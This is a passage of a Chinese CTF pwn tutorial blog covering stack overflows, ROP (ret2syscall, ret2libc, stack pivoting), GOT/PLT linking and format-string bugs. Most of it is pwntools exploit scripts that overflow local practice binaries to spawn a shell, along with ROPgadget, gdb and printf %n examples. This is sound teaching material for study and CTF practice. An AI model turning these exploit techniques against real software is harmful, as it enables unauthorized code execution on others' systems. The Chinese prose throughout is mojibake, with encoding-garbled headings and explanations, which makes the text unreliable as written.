class="hljs-number">0x804a080</span><br>payload = shellcode.ljust(<span class="hljs-number">112</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="4ã€ret2stack"><a href="#4ã€ret2stack" class="headerlink" title="4ã€ret2stack"></a>4ã€ret2stack</h3><p><img src="/2022/01/19/CTF/Pwn/Pwn/9ff0636bbf3d69e939555ed2a595ce92.png" alt="image-20220416150035544" style="zoom:67%;"></p><p><strong>exp.pyï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># gdbè°ƒè¯•å’Œå®é™…è¿è¡Œåœ°å€ä¸ä¸€è‡´</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>io = process(<span class="hljs-string">&quot;./ret2stack&quot;</span>)<br>io.recv()<br><br>shellcode = asm(shellcraft.amd64.sh())<br>buf_addr = <span class="hljs-number">0x804a080</span><br><br>payload = shellcode.ljust(<span class="hljs-number">120</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) + p64(buf_addr)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="0x03-è¿”å›å¯¼å‘ç¼–ç¨‹ROP"><a href="#0x03-è¿”å›å¯¼å‘ç¼–ç¨‹ROP" class="headerlink" title="0x03 è¿”å›å¯¼å‘ç¼–ç¨‹ROP"></a>0x03 è¿”å›å¯¼å‘ç¼–ç¨‹ROP</h2><blockquote><p>ROPï¼ˆReturn Oriented Programmingï¼‰</p></blockquote><h3 id="1ã€ret2syscall"><a href="#1ã€ret2syscall" class="headerlink" title="1ã€ret2syscall"></a>1ã€ret2syscall</h3><p><strong>ä»€ä¹ˆæ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Ÿ</strong></p><ul><li><p>æ“ä½œç³»ç»Ÿæä¾›ç»™ç”¨æˆ·çš„ç¼–ç¨‹æ¥å£</p></li><li><p>æ˜¯æä¾›è®¿é—®æ“ä½œç³»ç»Ÿæ‰€ç®¡ç†çš„åº•å±‚ç¡¬ä»¶çš„æ¥å£</p></li><li><p>æœ¬è´¨ä¸Šæ˜¯ä¸€äº›å†…æ ¸å‡½æ•°ä»£ç ï¼Œä»¥è§„èŒƒçš„æ–¹å¼é©±åŠ¨ç¡¬ä»¶</p></li><li><p>x86 é€šè¿‡ int 0x80 æŒ‡ä»¤è¿›è¡Œç³»ç»Ÿè°ƒç”¨ã€amd64 é€šè¿‡ syscall æŒ‡ä»¤è¿›è¡Œç³»ç»Ÿè°ƒç”¨</p></li></ul><p><strong>ä¸¾ä¾‹ï¼šmy_puts() -&gt; write() -&gt; sys_write()</strong></p><ul><li><p>my_puts(â€œHello world!â€); </p><ul><li>ç¨‹åº ELF ä¸­çš„ç”¨æˆ·ä»£ç  </li></ul></li><li><p>write(1, &amp;â€Hello world!â€, 12); </p><ul><li>libc ä¸­çš„ç”¨æˆ·ä»£ç </li></ul></li><li><p>[ eax = 4; ebx = 1; ecx = &amp;â€Hello world!â€; edx = 12; ] + int 0x80; =&gt; sys_write() </p><ul><li>Linux å†…æ ¸ä¸­çš„å†…æ ¸ä»£ç </li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> ç”¨äºæ‰“å°ç¨‹åºæˆ–è€…åº“æ–‡ä»¶æ‰€ä¾èµ–çš„å…±äº«åº“åˆ—è¡¨ã€‚</span><br><span class="hljs-meta">$</span><span class="bash"> ldd a.out</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0xb<br>mov ebx,[&quot;/bin/sh&quot;] <br>mov ecx,0<br>mov edx,0<br>int 0x80<br>=&gt; execve(&quot;/bin/sh&quot;,NULL,NULL)<br></code></pre></td></tr></table></figure><p><strong>ç¯¡æ”¹æ ˆå¸§ä¸Šè‡ªè¿”å›åœ°å€å¼€å§‹çš„ä¸€æ®µåŒºåŸŸä¸ºä¸€ç³»åˆ— gadget çš„åœ°å€ï¼Œæœ€ç»ˆè°ƒç”¨ç›®æ ‡ç³»ç»Ÿè°ƒç”¨ã€‚</strong></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/1fd38b16c7e1c8b6004cd0c52ac75b7d.png" alt="image-20220122144411306" style="zoom:50%;"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/006c15054c65897c8e094024ee8c0692.png" alt="image-20220122144820069" style="zoom:50%;"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary ret2syscall --only <span class="hljs-string">&quot;pop|ret&quot;</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary ret2syscall --only <span class="hljs-string">&quot;pop|ret&quot;</span> | head</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary ret2syscall --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep eax</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary ret2syscall --only <span class="hljs-string">&quot;int&quot;</span></span> <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)<br><br><span class="hljs-built_in">hex</span>(<span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)<br><br>pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>bin_sh = <span class="hljs-number">0x80be408</span><br><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bin_sh, int_0x80])<br><span class="hljs-comment"># payload = b&#x27;A&#x27; * 112 + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(bin_sh) + p32(int_0x80)</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="2ã€åŠ¨æ€é“¾æ¥è¿‡ç¨‹"><a href="#2ã€åŠ¨æ€é“¾æ¥è¿‡ç¨‹" class="headerlink" title="2ã€åŠ¨æ€é“¾æ¥è¿‡ç¨‹"></a>2ã€åŠ¨æ€é“¾æ¥è¿‡ç¨‹</h3><p><img src="/2022/01/19/CTF/Pwn/Pwn/50dcd703763d01496f75accb5ad58ec1.png" alt="image-20220410230349292" style="zoom: 60%;"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/c702b48e0b9ab154044249db358579f3.png" alt="image-20220411133422810"></p><p><strong>.gotã€.pltã€.got.plt ä¸‰ä¸ªèŠ‚</strong></p><ul><li><p>.got</p><ul><li>GOT(Global Offset Table)å…¨å±€åç§»è¡¨ã€‚</li><li>è¿™æ˜¯é“¾æ¥å™¨ä¸ºå¤–éƒ¨ç¬¦å·å¡«å……çš„å®é™…åç§»é‡ã€‚</li></ul></li><li><p>.plt</p><ul><li>PLT(Procedure Linkage Table)ç¨‹åºé“¾æ¥è¡¨ã€‚</li><li>ä½œç”¨æ˜¯ä¸€ä¸ªè·³æ¿ï¼Œä¿å­˜äº†æŸä¸ªç¬¦å·åœ¨é‡å®šä½è¡¨ä¸­çš„åç§»é‡(ç”¨æ¥ç¬¬ä¸€æ¬¡æŸ¥æ‰¾æŸä¸ªç¬¦å·)å’Œå¯¹åº”çš„ .got.plt çš„å¯¹åº”çš„åœ°å€ã€‚</li><li>å®ƒæœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œè¦ä¹ˆåœ¨ .got.plt èŠ‚ä¸­æ‹¿åˆ°åœ°å€ï¼Œå¹¶è·³è½¬ã€‚è¦ä¹ˆæ²¡æœ‰æ‰€éœ€åœ°å€ï¼Œè§¦å‘é“¾æ¥å™¨å»æ‰¾åˆ°æ‰€éœ€çš„åœ°å€ã€‚</li></ul></li><li>.got.plt<ul><li>è¿™ä¸ªæ˜¯GOTä¸“é—¨ä¸ºPLTå‡†å¤‡çš„èŠ‚ï¼Œä¿å­˜äº†é‡å®šä½åœ°å€ã€‚</li><li>.got.plt ä¸­çš„å€¼æ˜¯GOTçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒåŒ…å«ä¸Šè¿°PLTè¡¨æ‰€éœ€åœ°å€(å·²ç»æ‰¾åˆ°çš„å’Œéœ€è¦å»è§¦å‘çš„)ã€‚</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/b5641f5f5523f0bfbd8100608aeedca3.png" alt="image-20220411141334555" style="zoom: 67%;"></p><ul><li><p>è¿›ç¨‹é¦–æ¬¡è°ƒç”¨ <code>foo</code></p><ul><li>è·³è½¬åˆ° <code>.plt</code> ä¸­çš„ <code>foo</code> è¡¨é¡¹ï¼Œ<code>.plt</code> ä¸­çš„ä»£ç ç«‹å³è·³è½¬åˆ° <code>.got.plt</code> ä¸­è®°å½•çš„åœ°å€</li><li>ç”±äºè¿›ç¨‹æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ <code>foo</code>ï¼Œæ•… <code>.got.plt</code> ä¸­è®°å½•çš„åœ°å€æ˜¯ <code>foo@plt+6ï¼ˆpush indexï¼‰</code></li><li>å›åˆ° <code>.plt</code> ï¼Œè§£æ <code>foo</code> çš„å®é™…åœ°å€</li><li>è·³è½¬åˆ° <code>.plt</code> å¤´éƒ¨ä¸º <code>dl_runtime_resolve</code> å‡½æ•°ä¼ å‚ï¼Œè°ƒç”¨ <code>dl_runtime_resolve</code> å‡½æ•°è§£æ <code>foo</code> çš„å®é™…åœ°å€</li><li><code>foo</code> çš„å®é™…åœ°å€è¢«å¡«å…¥ <code>.got.plt</code> ä¸­ï¼Œæ­¤å <code>.got.plt</code> ä¸­ä¿å­˜çš„æ˜¯ <code>foo</code> çš„çœŸå®åœ°å€</li></ul></li><li><p>è¿›ç¨‹ç¬¬äºŒæ¬¡è°ƒç”¨ <code>foo</code></p><ul><li>ç›´æ¥è‡ª <code>.got.plt</code> è·³è½¬åˆ° <code>foo</code> çš„çœŸå®åœ°å€</li><li>æ²¡æœ‰äº†ç¬¬ä¸€æ¬¡çš„è§£æåœ°å€è¿‡ç¨‹</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/51cc039bbe87f3deb995ad9943ddf2fc.png" alt="image-20220411141451294" style="zoom: 80%;"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gcc -fno-pie -o dyntest test.c<br><br>$ gcc -fno-pie --static -o statest test.c<br><br>$ gcc -fno-pie -g -m32 -o link dylink.c<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gdb link<br><br><span class="hljs-comment"># æŸ¥çœ‹pltã€gotå†…å®¹</span><br>pwndbg&gt; plt<br>pwndbg&gt; got<br><br><span class="hljs-comment"># æŸ¥çœ‹å†…å­˜åœ°å€ä¸­çš„å€¼</span><br>pwndbg&gt; x 0x401030<br>pwndbg&gt; x/20 0x401030<br>pwndbg&gt; x/20x 0x7ffff7e65910<br>pwndbg&gt; x/20gx<br><br><span class="hljs-comment"># åæ±‡ç¼–</span><br>pwndbg&gt; disass 0x7ffff7e65910<br><br><span class="hljs-comment"># æœ‰Cè¯­è¨€ä»£ç </span><br>pwndbg&gt; b 9          <span class="hljs-comment"># åœ¨è¡Œå·9å¤„æ‰“æ–­ç‚¹</span><br>pwndbg&gt; info b       <span class="hljs-comment"># æŸ¥çœ‹æ–­ç‚¹</span><br>pwndbg&gt; d 1          <span class="hljs-comment"># åˆ é™¤ç¼–å·1çš„æ–­ç‚¹</span><br><br>pwndbg&gt; start      <span class="hljs-comment"># è¿è¡Œè‡³mainæˆ–è€…startå¤„</span><br>pwndbg&gt; c          <span class="hljs-comment"># continueï¼Œç»§ç»­æ‰§è¡Œ</span><br>pwndbg&gt; backtrace  <span class="hljs-comment"># å‡½æ•°è°ƒç”¨æ ˆ</span><br>pwndbg&gt; <span class="hljs-built_in">return</span>     <span class="hljs-comment">#è¿”å›</span><br>pwndbg&gt; q          <span class="hljs-comment">#quitï¼Œé€€å‡º </span><br></code></pre></td></tr></table></figure><h3 id="3ã€ret2libc"><a href="#3ã€ret2libc" class="headerlink" title="3ã€ret2libc"></a>3ã€ret2libc</h3><p><strong>ç¯¡æ”¹æ ˆå¸§ä¸Šè‡ªè¿”å›åœ°å€å¼€å§‹çš„ä¸€æ®µåŒºåŸŸä¸ºä¸€ç³»åˆ— gadget çš„åœ°å€ï¼Œæœ€ç»ˆè°ƒç”¨ libc ä¸­çš„å‡½æ•°è·å– shell</strong></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/19ab0cf25f7e2fdd20541fa96a03b157.png" alt="image-20220416150937152"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/1c81ca0aed75a2d75d45142ff9b4f90a.png" alt="image-20220416201555123"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ret2libc&quot;</span>)<br><br><span class="hljs-built_in">hex</span>(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc1&quot;</span>)<br><br><span class="hljs-comment"># elf = ELF(&quot;./ret2libc1&quot;)</span><br><span class="hljs-comment"># system_plt = elf.plt[&quot;system&quot;]</span><br><span class="hljs-comment"># bin_sh = next(elf.search(b&quot;/bin/sh&quot;))</span><br><br>bin_sh = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x8048460</span><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, system_plt, <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">4</span>, bin_sh])<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc2&quot;</span>)<br><br><span class="hljs-comment"># elf = ELF(&quot;./ret2libc2&quot;)</span><br><span class="hljs-comment"># buf2 = elf.symbols[&quot;buf2&quot;]</span><br><span class="hljs-comment"># gets_plt = elf.plt[&quot;gets&quot;]</span><br><span class="hljs-comment"># system_plt = elf.plt[&quot;system&quot;]</span><br><br>gets_plt = <span class="hljs-number">0x8048460</span><br>system_plt = <span class="hljs-number">0x8048490</span><br>buf2 = <span class="hljs-number">0x804A080</span><br><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, gets_plt, system_plt, buf2, buf2])<br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br>io = process(<span class="hljs-string">&quot;./ret2libc2&quot;</span>)<br><br>gets_plt = <span class="hljs-number">0x8048460</span><br>system_plt = <span class="hljs-number">0x8048490</span><br>pop_ebx_ret = <span class="hljs-number">0x804843d</span><br>buf2 = <span class="hljs-number">0x804A080</span><br><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, gets_plt, pop_ebx_ret, buf2, system_plt, <span class="hljs-number">0xdeadbeef</span>, buf2])<br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>åˆ°ç›®å‰ä¸ºæ­¢æˆ‘ä»¬åªæ¥è§¦äº†å†…å­˜ç©ºé—´åˆ†å¸ƒå·²çŸ¥çš„ROPï¼Œä½†åœ¨ç»å¤§éƒ¨åˆ†èµ›é¢˜ä¸­ï¼Œç”±äºASLRä¸PIEä¿æŠ¤çš„å¼€å¯ï¼Œåœ¨å‘é€æ”»å‡»è½½è·ï¼ˆpayloadï¼‰ä¹‹å‰ï¼Œå¾€å¾€éœ€è¦æˆ‘ä»¬å…ˆæ³„éœ²å†…å­˜åˆ†å¸ƒä¿¡æ¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># æ³¨æ„ libc ç‰ˆæœ¬é—®é¢˜</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot; :&quot;</span>, <span class="hljs-built_in">str</span>(elf.got[<span class="hljs-string">&quot;puts&quot;</span>]))<br>io.recvuntil(<span class="hljs-string">b&quot; : &quot;</span>)<br>libcBase = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>,drop = <span class="hljs-literal">True</span>),<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>success(<span class="hljs-string">&quot;libcBase -&gt; &#123;:#x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(libcBase))<br><span class="hljs-comment"># oneGadget = libcBase + 0x3a9fc</span><br><span class="hljs-comment"># payload = flat(cyclic(60),oneGadget)</span><br>payload = flat(cyclic(<span class="hljs-number">60</span>), libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>], <span class="hljs-number">0xdeadbeef</span>, <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh\x00&quot;</span>)))<br>io.sendlineafter(<span class="hljs-string">b&quot; :&quot;</span>,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ one_gadget libc-2.23.so<br></code></pre></td></tr></table></figure><h3 id="4ã€å…¶å®ƒçš„ROPæŠ€å·§"><a href="#4ã€å…¶å®ƒçš„ROPæŠ€å·§" class="headerlink" title="4ã€å…¶å®ƒçš„ROPæŠ€å·§"></a>4ã€å…¶å®ƒçš„ROPæŠ€å·§</h3><p><strong>æ ˆè¿ç§»</strong></p><ul><li><p>Definitionï¼šç”¨ gadget æ”¹å˜ esp çš„å€¼</p></li><li><p>Application</p><ul><li>æ ˆæº¢å‡ºé•¿åº¦ä¸è¶³ä»¥ä½¿ç”¨ç›´æ¥ ROP</li><li>æ ˆæº¢å‡º payload ä¼šå‡ºç°ç©ºå­—ç¬¦æˆªæ–­ï¼Œä¸”gadgetåœ°å€å«æœ‰ç©ºå­—ç¬¦</li><li>åœ¨æ³„éœ²åœ°å€ä¿¡æ¯åéœ€è¦æ–°çš„ ROP payload</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/c44801137adffe5bc3305be656fe8953.png" alt="image-20220416205727509" style="zoom:67%;"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/1c3ec8f61baef76c5b28e7aefd73347a.png" alt="image-20220416205917710"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/0d6387bcf57e8e0f36b3feba2cc473e6.png" alt="image-20220417105217094" style="zoom:80%;"></p><p><strong>x64 ROP ä½¿ç”¨ gadget ä¼ é€’å‚æ•°</strong></p><ul><li><p>pop rdi ; ret</p></li><li><p>pop rsi ; pop r15 ; ret ;</p></li><li><p>setting rdx and rcx is hard, no trivial gadgets</p></li><li>ret2csu</li></ul><p><strong>__libc_csu_init Gadgets for x64ï¼š</strong></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/90bd4f0b14c08380ca4bd454bdc34256.png" alt="image-20220416201917558" style="zoom:80%;"></p><h2 id="0x04-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#0x04-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="0x04 æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>0x04 æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><ul><li><p>æ³„éœ²æ ˆå†…å­˜</p></li><li><p>æ³„éœ²ä»»æ„åœ°å€å†…å­˜</p></li><li>ç¯¡æ”¹æ ˆå†…å­˜</li><li>ç¯¡æ”¹ä»»æ„åœ°å€å†…å­˜</li></ul><p><strong>Integer Overflowï¼ˆæ•´æ•°æº¢å‡ºï¼‰</strong></p><ul><li><p>History</p><ul><li>European Space Agency spacecraft Cluster Iâ€™s satellites exploded because of integer overflow (1996)</li></ul></li><li><p>IO2BO</p><ul><li>Array index out of bounds</li></ul></li><li><p>Integer Overflow in Linux kernel</p><ul><li>CVE-2013-1763 Linux Kernel netlink message family number overflow</li></ul></li><li><p>Integer Overflow vulnerability can be regarded as some kind of logic bug.</p></li><li><p>Integer overflow itself cannot be exploited, it is usually used to trigger buffer overflow/heap overflow or used with ROP, ret2libc, etc.</p></li></ul><p><strong>Format Stringï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼‰</strong></p><ul><li>History<ul><li>Discovered and public since June 1999</li><li>Shocked the security community in the second half of 2000(influenced lots of programs)</li></ul></li><li>Format String Attacks, Newsham (2001)</li><li>use %x and %n to achieve arbitrary read and write</li></ul><p><strong>Format String related Functions</strong></p><ul><li>fprintf â€” prints to a FILE stream</li><li>printf â€” prints to the â€˜stdoutâ€™ stream</li><li>sprintf â€” prints into a string</li><li>snprintf â€” prints into a string with length checking</li><li>vfprintf â€” print to a FILE stream from a va_arg structure</li><li>vprintf â€” prints to â€˜stdoutâ€™ from a va_arg structure</li><li>vsprintf â€” prints to a string from a va_arg structure</li><li>vsnprintf â€” prints to a string with length checking from a va_arg structure</li><li>setproctitle â€” set argv[]</li><li>syslog â€” output to the syslog facility</li></ul><p><strong>Format String syntax</strong></p><ul><li><p>%s print null terminated string pointed by arg pointer</p></li><li><p>%x print hex value of the arg (arbitrary read)</p></li><li><p>%n store the bytes_written to location pointed by arg pointer</p></li><li><p>%hn - store 2 bytes (short integer)</p></li><li><p>%hhn - store 1 byte</p></li><li><p>%<positive integer>c print arbitrary count of chars controlled by integer</positive></p><ul><li>Example: %123c (filled by space)  %0512c (filled by 0)</li><li>Useful to change bytes_written so far</li></ul></li><li><p>%<positive integer>$<fmt> specify arg index</fmt></positive></p><ul><li>Example: %12$n</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,<span class="hljs-string">&quot;Hello World&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>);<br>    <br>    <span class="hljs-keyword">int</span> a=<span class="hljs-number">1</span>,b=<span class="hljs-number">2</span>,c=<span class="hljs-number">3</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$d&quot;</span>,a,b,c);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$s&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$p&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$n&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x402004%5$s&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x402004%5$n&quot;</span>);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2022/01/19/CTF/Pwn/Pwn/199ee35257509a673c6b4e9468778695.png" alt="image-20220418230459176" style="zoom:67%;"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/fb6fbedf97453e81fa6e77255564e5b9.png" alt="image-20220419220930275" style="zoom:67%;"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 